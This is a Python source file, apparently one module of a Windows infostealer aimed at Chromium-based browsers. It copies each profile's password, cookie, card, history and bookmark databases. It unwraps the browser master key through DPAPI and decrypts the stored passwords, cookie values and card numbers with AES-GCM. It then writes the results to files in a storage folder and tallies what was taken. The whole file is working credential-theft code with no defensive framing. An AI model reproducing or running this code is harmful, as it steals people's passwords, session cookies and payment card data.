from sqlite3 import connect
from shutil import copyfile
from base64 import b64decode
from json import loads, dump
from re import compile, findall
from multiprocessing import Process
from datetime import datetime, timedelta
from os import path, makedirs, remove, listdir

from Crypto.Cipher import AES
from win32.win32crypt import CryptUnprotectData

from ..utils.config import ChromiumConfig, browsers_stats


class Chromium(Process):

    def __init__(self, *args):
        Process.__init__(self)

        self.config = ChromiumConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

        self.path = rf"{self.storage_path}\Browsers\{self.browser_name}"

    def _get_profiles(self):

        if self.browser_path[-9:] in ["User Data"]:

            pattern = compile(r"Default|Profile \d+")
            return [path.join(self.browser_path, profile) for profile in sum([pattern.findall(path) for path in listdir(self.browser_path)], [])]

        return [self.browser_path]

    def _check_paths(self):

        if path.exists(self.browser_path) and any(self.statuses):

            makedirs(rf"{self.storage_path}\Browsers\{self.browser_name}")
            self.profiles = self._get_profiles()

            browsers_stats['browsers'].append(self.browser_name)

    def _get_key(self):

        with open(self.state_path, "r", encoding="utf-8") as state:
            return CryptUnprotectData(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    def _get_datetime(self, date):

        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    def _decrypt(self, buff, master_key):

        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"

    def _write_passwords(self, *args):

        passwords_list = args[1].execute(self.config.PasswordsSQL).fetchall()

        if not passwords_list:
            return

        data = self.config.PasswordsData
        temp = [
            data.format(result[0], result[1], self._decrypt(result[2], args[2]))
            for result in passwords_list
        ]

        with open(rf"{self.path}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
            passwords.write("".join(item for item in list(set(temp))))

        browsers_stats['passwords'] += len(list(set(temp)))

    def _write_cookies(self, *args):

        cookies_list = args[1].execute(self.config.CookiesSQL).fetchall()

        if not cookies_list:
            return

        results = [
            {
                "creation_utc": result[0],
                "top_frame_site_key": result[1],
                "host_key": result[2],
                "name": result[3],
                "value": result[4],
                "encrypted_value": self._decrypt(result[5], args[2]),
                "path": result[6],
                "expires_utc": result[7],
                "is_secure": result[8],
                "is_httponly": result[9],
                "last_access_utc": result[10],
                "has_expires": result[11],
                "is_persistent": result[12],
                "priority": result[13],
                "samesite": result[14],
                "source_scheme": result[15],
                "source_port": result[16],
                "is_same_party": result[17],
            }
            for result in cookies_list
        ]

        with open(rf"{self.path}\{args[0]} Cookies.json", "a", encoding="utf-8") as cookies:
            dump(results, cookies)

        browsers_stats['cookies'] += len(cookies_list)

    def _write_cards(self, *args):

        cards_list = args[1].execute(self.config.CardsSQL).fetchall()

        if not cards_list:
            return

        data = self.config.CardsData
        temp = [
            data.format(result[0], self._decrypt(result[3], args[2]), result[1], result[2])
            for result in cards_list
        ]

        with open(rf"{self.path}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
            cards.write("".join(item for item in list(set(temp))))

    def _write_history(self, *args):

        results = args[1].execute(self.config.HistorySQL).fetchall()

        if not results:
            return

        history_list = (args[1].execute(self.config.HistoryLinksSQL % int(item[0])).fetchone() for item in results)

        data = self.config.HistoryData
        temp = [
            data.format(result[0], result[1], self._get_datetime(result[2]))
            for result in history_list
        ]

        with open(rf"{self.path}\{args[0]} History.txt", "a", encoding="utf-8") as history:
            history.write("".join(item for item in list(set(temp))))

        browsers_stats['history'] += len(list(set(temp)))

    def _write_bookmarks(self, *args):

        bookmarks_list = sum([self.config.BookmarksRegex.findall(item) for item in args[1].split("{")], [])

        if not bookmarks_list:
            return

        data = self.config.BookmarksData
        temp = [
            data.format(result[0], result[1])
            for result in bookmarks_list
        ]

        with open(rf"{self.path}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
            bookmarks.write("".join(item for item in list(set(temp))))

    def _get_browser_paths(self, profile):
        return (
            {
                "status": self.statuses[0],
                "name": "Passwords",
                "path": rf"{profile}\Login Data",
                "alt_path": None,
                "method": self._write_passwords,
                "error": "No passwords found"
            },
            {
                "status": self.statuses[1],
                "name": "Cookies",
                "path": rf"{profile}\Cookies",
                "alt_path": rf"{profile}\Network\Cookies",
                "method": self._write_cookies,
                "error": "No cookies found"
            },
            {
                "status": self.statuses[2],
                "name": "Cards",
                "path": rf"{profile}\Web Data",
                "alt_path": None,
                "method": self._write_cards,
                "error": "No cards found"
            },
            {
                "status": self.statuses[3],
                "name": "History",
                "path": rf"{profile}\History",
                "alt_path": None,
                "method": self._write_history,
                "error": "No history found"
            },
            {
                "status": self.statuses[4],
                "name": "Bookmarks",
                "path": rf"{profile}\Bookmarks",
                "alt_path": None,
                "method": self._write_bookmarks,
                "error": "No bookmarks found"
            }
        )

    def _check_functions(self):

        for profile in self.profiles:

            functions = self._get_browser_paths(profile)

            for item in functions:

                try:

                    if item["status"] is False:
                        continue

                    db_format = "" if item["name"] in ["Bookmarks"] else ".db"
                    db_path = rf"{self.storage_path}\{self.browser_name} {item['name']}{db_format}"
                    profile_name = profile.replace("\\", "/").split("/")[-1]

                    if path.exists(item["path"]):
                        copyfile(item["path"], db_path)

                    elif item["alt_path"] and path.exists(item["alt_path"]):
                        copyfile(item["alt_path"], db_path)

                    else:
                        if self.errors is True: print(f"[{self.browser_name}]: {item['error']}")
                        return

                    if item["name"] in ["Bookmarks"]:
                        with open(db_path, "r", encoding="utf-8") as bookmarks:
                            item["method"](profile_name, bookmarks.read())
                        bookmarks.close()

                    else:
                        with connect(db_path) as connection:
                            connection.text_factory = lambda text: text.decode(errors="ignore")
                            cursor = connection.cursor()

                            item["method"](profile_name, cursor, self._get_key())

                            cursor.close()
                        connection.close()

                    remove(db_path)

                except Exception as e:
                    if self.errors is True: print(f"[{self.browser_name}]: {repr(e)}")

    def run(self):

        try:

            self._check_paths()
            self._check_functions()

        except Exception as e:
            if self.errors is True: print(f"[{self.browser_name}]: {repr(e)}")
